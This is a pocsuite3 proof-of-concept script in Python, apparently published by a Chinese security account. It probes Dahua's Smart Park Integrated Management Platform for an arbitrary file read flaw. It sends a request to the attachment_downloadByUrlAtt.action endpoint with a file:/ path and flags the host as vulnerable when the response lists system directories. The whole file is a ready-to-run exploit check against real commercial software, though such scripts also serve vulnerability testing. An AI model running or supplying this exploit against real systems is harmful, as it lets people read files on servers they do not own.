# _*_ coding:utf-8 _*_
# @Time : 2023/11/28 21:54
# @Author: 为赋新词强说愁

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class dahuaAttachmet(POCBase):
    pocDesc = '''大华智慧园区综合管理平台attachment_downloadByUrlAtt接口任意文件读取漏洞'''
    vulID = '2023112802'
    version = '1'
    author = '公众号网络安全透视镜'
    vulDate = '2023-11-28'
    createDate = '2023-11-28'
    updateDate = '2023-11-28'
    name = '大华智慧园区综合管理平台attachment_downloadByUrlAtt接口任意文件读取漏洞'
    appName = '大华智慧园区综合管理平台'



    def _verify(self):

        result = {}
        path = "/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
        }

        url = self.url + path
        payload = "/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/"
        try:
            response = requests.get(url, headers=headers,verify=False)
        # 验证成功输出相关信息
            if response.status_code == 200 and 'etc' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(dahuaAttachmet)